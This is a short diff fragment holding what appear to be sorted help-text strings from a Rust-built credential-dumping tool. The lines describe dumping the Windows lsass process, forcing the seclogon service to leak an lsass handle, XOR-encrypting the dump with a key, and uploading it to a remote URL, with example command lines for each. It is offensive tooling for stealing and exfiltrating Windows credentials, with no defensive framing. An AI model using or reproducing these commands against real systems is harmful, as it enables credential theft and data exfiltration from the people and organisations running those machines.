@@ -1,0 +1,15 @@
+ -- --crate-type cdylib 
+ --decrypt       Decrypt a previously generated dump file.
+ --decrypt -i xored.txt -o decrypted.txt -k secretKey
+ --dump          Dump lsass.
+ --dump -k secretKey -u http://remotehost/upload
+ --dump -k secretKey -u http://remotehost/upload --force
+ --dump|--decrypt [options]
+ --force         Force seclogon's service to leak a lsass handle
+ --help          Print this help menu.
+ --input         Encrypted dump file [default: c:\temp\input.txt]
+ --key           Encryption key [default: 1234abcd]
+ --output        Destination path [default: c:\temp\output.txt]
+ --release
+ --upload        Upload URL
+" --dump|--decrypt [options]"", program);"
